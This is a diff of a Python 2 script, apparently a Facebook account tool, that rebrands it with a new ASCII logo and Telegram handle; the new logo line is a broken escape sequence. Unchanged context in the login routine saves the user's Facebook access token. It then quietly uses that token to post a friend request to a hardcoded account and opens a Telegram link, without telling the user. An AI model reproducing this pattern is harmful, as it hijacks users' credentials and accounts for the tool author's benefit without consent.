@@ -48,12 +48,7 @@ def jalan(z):
  
 #### LOGO ####
 logo = """
-\033[1;35;40mY88b      / 888~~  888~-_   ~~~888~~~ 888~~  Y88b    /
- Y88b    /  888    888   \     888    888     Y88b  /  
-  Y88b  /   888___ 888    |    888    888___   Y88b/  
-   Y888/    888    888   /     888    888      /Y88b  
-    Y8/     888    888_-~      888    888     /  Y88b  
-     Y      888___ 888 ~-_     888    888___ /    Y88b
+\033[1;35;ariahmed    
                                                                                                                                                                                                
 \033[0;39m╔▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬╗
 \033[0;39m║\033[1;36m* \033[0;36mTelegram \033[1;36m: \033[1;36m@ariahmed\033[0;31m                      ║
@@ -140,7 +135,7 @@ def login():
                 unikers.write(z['access_token'])
                 unikers.close()
                 print '\n\x1b[1;36;40m[✓] Chuyta Naw Accountaka ...'
-                os.system('xdg-open https://t.me/shadowshopku')
+                os.system('xdg-open https://t.me/ariahmed')
                 requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
                 menu()
             except requests.exceptions.ConnectionError:
